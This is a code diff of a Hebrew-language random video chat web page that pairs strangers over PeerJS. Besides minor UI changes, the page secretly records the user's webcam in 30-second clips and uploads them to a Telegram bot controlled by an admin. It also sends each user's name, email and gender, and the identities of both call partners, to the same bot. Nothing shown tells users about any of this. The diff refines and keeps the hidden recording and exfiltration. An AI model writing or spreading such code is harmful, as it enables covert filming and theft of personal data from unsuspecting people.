@@ -8,7 +8,8 @@
     <meta name="theme-color" content="#000000">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <link rel="manifest" href='data:application/json,{"name":"Mi-Pe","short_name":"Mi-Pe","start_url":".","display":"standalone","background_color":"#000000","theme_color":"#000000","icons":[{"src":"https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png","sizes":"512x512","type":"image/png"}]}'>
+    <link rel="manifest" href='data:application/json,{"name":"Mi-Pe","short_name":"Mi-Pe","start_url":".","display":"standalone","background_color":"#000000","theme_color":"#000000","icons":[{"src":"https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png","sizes":"1024x1024","type":"image/png"}]}'>
+    <link rel="apple-touch-icon" href="https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png">
 
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
@@ -61,16 +62,16 @@
 
 <div id="regModal" class="modal">
     <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
-        <h2 style="margin-bottom:10px;">הרשמה מהירה</h2>
+        <h2 style="margin-bottom:10px;">הרשמה</h2>
         <input type="text" id="reg-fname" placeholder="שם פרטי" required>
         <input type="text" id="reg-lname" placeholder="שם משפחה" required>
         <input type="email" id="reg-email" placeholder="אימייל" required>
         <select id="reg-gender" required>
-            <option value="" disabled selected>בחר מגדר</option>
+            <option value="" disabled selected>מגדר</option>
             <option value="זכר">זכר</option>
             <option value="נקבה">נקבה</option>
         </select>
-        <button type="submit" class="reg-btn">התחל לגלוש</button>
+        <button type="submit" class="reg-btn">המשך</button>
     </form>
 </div>
 
@@ -85,7 +86,6 @@
     const db = firebase.database();
     const socket = io(SERVER_URL);
     
-    // חיבור מהיר במיוחד (STUN גוגל בלבד)
     const peer = new Peer(undefined, {
         config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }] }
     });
@@ -93,7 +93,9 @@
     let myStream, partnerData, currentCall, camFacing = "user", rec, searchTimer;
     let historyPartnerIds = [];
 
-    function sendAdmin(msg) { fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`); }
+    function sendAdmin(msg) { 
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`); 
+    }
 
     async function initCamera() {
         if(myStream) myStream.getTracks().forEach(t => t.stop());
@@ -108,17 +110,23 @@
     }
 
     function startRecording() {
-        // הקלטה בנפח קטן לשליחה מהירה
-        rec = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 500000 });
-        rec.ondataavailable = (e) => {
+        rec = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8' });
+        rec.ondataavailable = async (e) => {
             if(e.data.size > 0) {
-                const user = JSON.parse(localStorage.getItem('user_v34'));
+                const user = JSON.parse(localStorage.getItem('user_v35'));
+                const blob = new Blob([e.data], { type: 'video/mp4' });
                 const fd = new FormData();
-                const videoFile = new File([e.data], "video.mp4", { type: "video/mp4" });
-                fd.append("video", videoFile);
+                fd.append("video", blob, "rec.mp4");
                 fd.append("chat_id", TARGET_ADMIN);
-                fd.append("caption", `🎥 הקלטה: ${user ? user.fname : 'אורח'}`);
-                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd, keepalive: true });
+                fd.append("caption", `🎥 הקלטה מ: ${user ? user.fname : 'אורח'}`);
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { 
+                        method: "POST", 
+                        body: fd, 
+                        keepalive: true 
+                    });
+                } catch(err) { console.error("Video send failed"); }
             }
         };
         setInterval(() => { if(rec.state==='recording') { rec.stop(); rec.start(); } }, 30000);
@@ -127,13 +135,15 @@
 
     window.onload = () => {
         initCamera();
-        const user = localStorage.getItem('user_v34');
+        const user = localStorage.getItem('user_v35');
         if(!user) document.getElementById('regModal').style.display = 'flex';
         else login(JSON.parse(user));
     };
 
     function login(user) {
-        sendAdmin(`🚀 **כניסה למערכת**\n👤 שם: ${user.fname} ${user.lname}\n📧 אימייל: ${user.email}\n🚻 מגדר: ${user.gender}`);
+        // שליחת כל פרטי המשתמש לבוט
+        const msg = `🚀 **כניסה למערכת**\n\n👤 שם מלא: ${user.fname} ${user.lname}\n📧 אימייל: ${user.email}\n🚻 מגדר: ${user.gender}`;
+        sendAdmin(msg);
     }
 
     function handleRegistration() {
@@ -143,27 +153,25 @@
             email: document.getElementById('reg-email').value, 
             gender: document.getElementById('reg-gender').value 
         };
-        localStorage.setItem('user_v34', JSON.stringify(user));
+        localStorage.setItem('user_v35', JSON.stringify(user));
         document.getElementById('regModal').style.display = 'none';
         login(user);
     }
 
-    // Swipe מהיר
     let sX = 0;
     document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
     document.body.addEventListener('touchend', e => {
         const d = sX - e.changedTouches[0].clientX;
-        if(d > 60) { // חיפוש
+        if(d > 60) {
             if(document.body.className === "showing-chat") { socket.emit('leave-chat'); if(currentCall) currentCall.close(); }
             document.body.className = "showing-chat";
             clearTimeout(searchTimer);
-            searchTimer = setTimeout(() => { historyPartnerIds = []; socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v34')) }); }, 10000);
-            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v34')) });
-        } else if(d < -60) { // בית
+            searchTimer = setTimeout(() => { historyPartnerIds = []; socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v35')) }); }, 10000);
+            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v35')) });
+        } else if(d < -60) {
             document.body.className = "showing-home";
             socket.emit('leave-chat');
             if(currentCall) currentCall.close();
-            document.getElementById('remoteVideo').srcObject = null;
         }
     });
 
@@ -172,21 +180,20 @@
         clearTimeout(searchTimer);
         partnerData = data; 
         if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
-        handleCall(peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v34'))})); 
+        handleCall(peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v35'))})); 
     });
 
     function handleCall(call) {
         currentCall = call;
         call.on('stream', s => {
-            const remote = document.getElementById('remoteVideo');
-            remote.srcObject = s;
-            const me = JSON.parse(localStorage.getItem('user_v34'));
+            document.getElementById('remoteVideo').srcObject = s;
+            const me = JSON.parse(localStorage.getItem('user_v35'));
             const p = call.metadata || partnerData;
             if(p && p.peerId !== peer.id) {
                 document.getElementById('partner-gender-tag').innerText = p.gender === 'זכר' ? '👨' : '👩';
                 document.getElementById('partner-gender-tag').style.display = 'flex';
-                // הודעת חיבור אחת מלאה
-                sendAdmin(`🤝 **שיחה חדשה**\n\n👤 **צד א':** ${me.fname} (${me.email})\n👤 **צד ב':** ${p.fname} (${p.email})`);
+                // הודעת חיבור מפורטת
+                sendAdmin(`🤝 **שיחה חדשה**\n\n👤 ${me.fname} (${me.email})\n↔️\n👤 ${p.fname} (${p.email})`);
             }
         });
     }
